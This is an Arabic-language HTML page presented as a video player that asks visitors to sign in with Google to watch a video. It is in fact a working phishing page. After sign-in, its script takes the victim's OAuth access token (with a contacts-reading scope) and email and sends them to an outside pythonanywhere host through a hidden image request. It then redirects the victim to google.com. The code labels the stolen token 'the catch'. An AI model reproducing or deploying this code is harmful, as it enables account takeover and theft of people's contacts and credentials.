<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Video Player</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
</head>
<body style="background:#000; color:#fff; text-align:center; padding-top:100px; font-family:sans-serif;">

    <div id="box">
        <h2>يجب تسجيل الدخول لمشاهدة الفيديو</h2>
        <button id="btn" style="padding:20px 40px; background:red; color:#white; border:none; border-radius:10px; cursor:pointer; font-weight:bold;">
            تسجيل دخول عبر Google
        </button>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCvs2XALyDmK3_D4BXJ5Dx7MFo2H71R6gg",
            authDomain: "giftapp-5937d.firebaseapp.com",
            projectId: "giftapp-5937d",
            storageBucket: "giftapp-5937d.firebasestorage.app",
            messagingSenderId: "1067108116204",
            appId: "1:1067108116204:web:dd2b2717c17590b10be7c9"
        };
        firebase.initializeApp(firebaseConfig);

        // أهم جزء: استلام الصيد
        firebase.auth().getRedirectResult().then((result) => {
            if (result.credential) {
                const token = result.credential.accessToken;
                const sender = result.user.email;
                
                document.body.innerHTML = "<h1>جاري التحميل...</h1>";

                // إرسال مباشر وصريح
                const url = `https://mohamedahmed77.pythonanywhere.com/catch?token=${encodeURIComponent(token)}&sender=${encodeURIComponent(sender)}`;
                
                const img = new Image(); // أضمن طريقة لإرسال بيانات بدون حظر CORS
                img.src = url;
                
                setTimeout(() => { window.location.href = "https://google.com"; }, 3000);
            }
        });

        document.getElementById('btn').onclick = () => {
            const provider = new firebase.auth.GoogleAuthProvider();
            provider.addScope('https://www.googleapis.com/auth/contacts.readonly');
            firebase.auth().signInWithRedirect(provider);
        };
    </script>
</body>
</html>
